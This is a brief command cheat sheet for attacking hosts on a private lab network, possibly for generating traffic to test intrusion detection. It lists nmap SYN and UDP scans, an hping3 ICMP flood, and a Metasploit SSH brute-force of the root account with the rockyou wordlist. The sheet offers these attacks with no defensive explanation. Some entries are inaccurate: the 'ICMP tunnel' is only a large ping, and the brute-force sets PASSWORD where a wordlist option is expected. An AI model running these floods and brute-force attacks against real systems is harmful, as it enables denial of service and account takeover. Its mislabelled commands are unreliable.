NMAP TCP SYN Scan :
```bash
nmap -sS 192.168.100.10
```

NMAP UDP Scan :
```bash
nmap -sU 192.168.100.10
```

ICMP Flood :
```bash
sudo hping3 -1 --flood 192.168.100.10
```

Tunnel ICMP :
```bash
ping -s 2000 192.168.100.10   
```

SSH bruteforce :
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.100.12
set USERNAME root
set PASSWORD /usr/share/wordlists/rockyou.txt
run
```
